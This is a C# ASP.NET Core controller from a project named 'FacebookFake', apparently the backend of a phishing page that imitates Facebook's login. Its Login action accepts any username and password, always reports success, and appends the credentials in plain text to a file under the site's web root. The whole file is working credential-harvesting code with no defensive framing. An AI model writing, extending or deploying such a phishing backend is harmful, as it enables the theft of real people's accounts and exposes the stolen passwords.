using FacebookFake.Models;
using Microsoft.AspNetCore.Mvc;

namespace FacebookFake.Controllers
{
    public class FacebookController : Controller
    {
        private readonly IWebHostEnvironment _webHostEnvironment;
        public FacebookController(IWebHostEnvironment webHostEnvironment)
        {
            _webHostEnvironment = webHostEnvironment;
        }

        [HttpGet]
        public IActionResult Index()
        {
            return View();
        }
        [HttpGet]
        public IActionResult Login(string userName, string password)
        {
            DataObjectResult dataObject = new DataObjectResult();
            if(!string .IsNullOrEmpty(userName) && !string.IsNullOrEmpty(password))
            {
                
                dataObject.Success = true;
                dataObject.Message = "Login success";

                string path = Path.Combine(_webHostEnvironment.WebRootPath, "Data");
                if (!Directory.Exists(path))
                {
                    Directory.CreateDirectory(path);
                }
                string filePath = Path.Combine(path, "account.txt");
                System.IO.File.AppendAllText(filePath, $"userName: {userName} password: {password}");
            }
            else
            {
                dataObject.Success = false;
                dataObject.Message = "Login failed";
            }
            return Json(dataObject);
        }
    }
}
